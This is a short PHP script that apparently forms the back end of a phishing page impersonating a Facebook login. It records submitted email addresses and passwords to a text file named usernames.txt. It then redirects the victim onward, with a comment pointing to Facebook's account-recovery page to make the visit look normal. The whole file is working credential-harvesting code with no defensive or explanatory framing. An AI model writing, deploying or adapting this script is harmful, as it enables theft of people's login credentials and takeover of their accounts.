<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://facebook.com/recover/initiate/?ref=www_reauth_page
header("Location: $url");
exit();
?>